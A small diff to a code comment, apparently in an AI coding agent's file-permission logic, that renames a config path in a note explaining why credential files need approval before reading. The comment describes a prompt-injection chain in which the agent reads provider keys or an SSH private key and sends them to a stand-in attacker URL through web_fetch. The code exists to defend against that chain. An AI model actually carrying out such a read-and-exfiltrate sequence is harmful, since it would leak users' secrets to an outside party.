@@ -2,7 +2,7 @@
  * Files whose contents are credentials. The read-only tools (read, grep)
  * run without a prompt, and web_fetch can send anything the model has
  * read to any URL, so a prompt injection could chain them: read
- * ~/.config/kimiflare/config.json (provider keys) or ~/.ssh/id_ed25519,
+ * ~/.config/autopilot/config.json (provider keys) or ~/.ssh/id_ed25519,
  * then fetch https://attacker/?k=<it>. Reading these paths asks first.
  *
  * Paths are checked as given and after resolving symlinks, so a link in
